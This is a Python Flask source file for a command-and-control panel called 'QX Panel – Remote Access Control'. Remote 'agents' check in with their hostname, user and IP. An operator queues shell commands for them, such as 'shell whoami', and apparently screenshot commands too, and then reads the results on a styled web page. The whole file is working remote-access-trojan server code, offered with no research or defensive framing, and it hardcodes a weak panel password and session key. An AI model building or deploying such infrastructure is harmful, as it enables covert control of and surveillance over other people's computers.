from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import time
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "qx_secret_987654"

PANEL_PASSWORD = "admin123"

agents = {}
commands = {}
results = {}

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QX Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #050508;
            color: #e4e4e7;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Background glow */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 20%, rgba(0, 212, 255, 0.06) 0%, transparent 50%),
                        radial-gradient(circle at 70% 80%, rgba(0, 150, 255, 0.04) 0%, transparent 50%);
            z-index: -1;
            animation: bgMove 20s ease-in-out infinite alternate;
        }

        @keyframes bgMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-5%, 5%); }
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px 24px;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 48px;
            animation: fadeDown 0.6s ease;
        }

        .header h1 {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }

        .header p {
            color: #52525b;
            font-size: 14px;
            font-weight: 400;
        }

        /* Cards */
        .card {
            background: rgba(20, 20, 28, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
            backdrop-filter: blur(12px);
            animation: fadeUp 0.5s ease both;
            transition: border-color 0.3s ease, transform 0.2s ease;
        }

        .card:hover {
            border-color: rgba(0, 212, 255, 0.15);
        }

        .card:nth-child(2) { animation-delay: 0.1s; }
        .card:nth-child(3) { animation-delay: 0.2s; }
        .card:nth-child(4) { animation-delay: 0.3s; }

        .card h3 {
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #71717a;
            margin-bottom: 16px;
        }

        /* Agent item */
        .agent {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 12px;
            margin-bottom: 8px;
            transition: background 0.2s ease;
        }

        .agent:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .agent-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .agent-name {
            font-weight: 600;
            font-size: 15px;
            color: #f4f4f5;
        }

        .agent-meta {
            font-size: 12px;
            color: #71717a;
        }

        .status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            font-weight: 600;
            padding: 6px 12px;
            border-radius: 20px;
        }

        .status.online {
            background: rgba(0, 255, 157, 0.1);
            color: #00ff9d;
        }

        .status.offline {
            background: rgba(255, 85, 85, 0.1);
            color: #ff5555;
        }

        .status-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: currentColor;
        }

        .status.online .status-dot {
            animation: pulse 1.5s ease infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.85); }
        }

        /* Form */
        .form-group {
            margin-bottom: 14px;
        }

        select, input[type="text"], input[type="password"] {
            width: 100%;
            padding: 13px 16px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            color: #f4f4f5;
            font-size: 14px;
            font-family: inherit;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }

        select:focus, input:focus {
            border-color: rgba(0, 212, 255, 0.4);
            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
        }

        select option {
            background: #14141c;
            color: #f4f4f5;
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
            color: #050508;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: transform 0.15s ease, box-shadow 0.2s ease, opacity 0.2s ease;
        }

        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.25);
        }

        button:active {
            transform: translateY(0);
        }

        /* Results */
        .result-block {
            margin-bottom: 16px;
        }

        .result-block b {
            display: block;
            font-size: 13px;
            color: #a1a1aa;
            margin-bottom: 8px;
        }

        pre {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 14px 16px;
            font-size: 13px;
            line-height: 1.5;
            overflow-x: auto;
            color: #d4d4d8;
            white-space: pre-wrap;
            word-break: break-all;
            animation: fadeIn 0.3s ease;
        }

        .empty {
            color: #52525b;
            font-size: 14px;
            text-align: center;
            padding: 20px 0;
        }

        /* Login */
        .login-card {
            max-width: 380px;
            margin: 120px auto 0;
            animation: fadeUp 0.5s ease;
        }

        .login-card h2 {
            text-align: center;
            font-size: 22px;
            margin-bottom: 24px;
            color: #f4f4f5;
        }

        .logout-link {
            display: inline-block;
            margin-bottom: 28px;
            color: #71717a;
            font-size: 13px;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .logout-link:hover {
            color: #00d4ff;
        }

        /* Animations */
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(16px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeDown {
            from { opacity: 0; transform: translateY(-12px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* Auto refresh notice */
        .refresh-note {
            text-align: center;
            font-size: 11px;
            color: #3f3f46;
            margin-top: 32px;
        }
    </style>
</head>
<body>
    <div class="container">

        {% if not session.get('logged_in') %}
        <div class="login-card card">
            <h2>QX Panel</h2>
            <form method="POST" action="/login">
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required autofocus>
                </div>
                <button type="submit">Login</button>
            </form>
        </div>

        {% else %}
        <div class="header">
            <h1>QX Panel</h1>
            <p>Remote Access Control</p>
        </div>

        <a href="/logout" class="logout-link">← Logout</a>

        <!-- Agents -->
        <div class="card">
            <h3>Agents</h3>
            {% if agents %}
                {% for aid, info in agents.items() %}
                <div class="agent">
                    <div class="agent-info">
                        <span class="agent-name">{{ info.hostname }}</span>
                        <span class="agent-meta">{{ info.user }} · {{ info.ip }} · {{ info.last_seen_str }}</span>
                    </div>
                    <div class="status {{ 'online' if (now - info.last_seen) < 35 else 'offline' }}">
                        <span class="status-dot"></span>
                        {{ 'ONLINE' if (now - info.last_seen) < 35 else 'OFFLINE' }}
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <p class="empty">No agents connected</p>
            {% endif %}
        </div>

        <!-- Send Command -->
        <div class="card">
            <h3>Send Command</h3>
            <form method="POST" action="/send">
                <div class="form-group">
                    <select name="agent_id">
                        {% for aid, info in agents.items() %}
                        <option value="{{ aid }}">{{ info.hostname }} — {{ info.user }}</option>
                        {% endfor %}
                    </select>
                </div>
                <div class="form-group">
                    <input type="text" name="cmd" placeholder="info · shell whoami · shell dir · ss ..." required autocomplete="off">
                </div>
                <button type="submit">Send Command</button>
            </form>
        </div>

        <!-- Results -->
        <div class="card">
            <h3>Results</h3>
            {% if results %}
                {% for aid, res_list in results.items() %}
                <div class="result-block">
                    <b>{{ agents[aid].hostname if aid in agents else aid }}</b>
                    {% for r in res_list[-6:] %}
                    <pre>{{ r }}</pre>
                    {% endfor %}
                </div>
                {% endfor %}
            {% else %}
                <p class="empty">No results yet</p>
            {% endif %}
        </div>

        <p class="refresh-note">Auto-refresh every 8 seconds · Page reloads on command send</p>
        {% endif %}

    </div>

    <script>
        // Auto refresh every 8 seconds (only when logged in)
        {% if session.get('logged_in') %}
        setTimeout(() => location.reload(), 8000);
        {% endif %}
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    now = time.time()
    for aid in list(agents.keys()):
        agents[aid]["last_seen_str"] = datetime.fromtimestamp(agents[aid]["last_seen"]).strftime("%H:%M:%S")
    return render_template_string(HTML, agents=agents, results=results, now=now, session=session)

@app.route("/login", methods=["POST"])
def login():
    if request.form.get("password") == PANEL_PASSWORD:
        session["logged_in"] = True
    return redirect(url_for("index"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/send", methods=["POST"])
def send():
    if not session.get("logged_in"):
        return redirect(url_for("index"))
    aid = request.form.get("agent_id")
    cmd = request.form.get("cmd", "").strip()
    if aid and cmd:
        commands[aid] = cmd
    return redirect(url_for("index"))

@app.route("/api/check", methods=["POST"])
def api_check():
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"cmd": None})
    agents[aid] = {
        "hostname": data.get("hostname", "?"),
        "user": data.get("user", "?"),
        "ip": data.get("ip", "?"),
        "last_seen": time.time()
    }
    cmd = commands.pop(aid, None)
    return jsonify({"cmd": cmd})

@app.route("/api/result", methods=["POST"])
def api_result():
    data = request.json or {}
    aid = data.get("id")
    result = data.get("result", "")
    if not aid:
        return jsonify({"ok": False})
    if aid not in results:
        results[aid] = []
    results[aid].append(f"[{datetime.now().strftime('%H:%M:%S')}] {result}")
    results[aid] = results[aid][-15:]
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
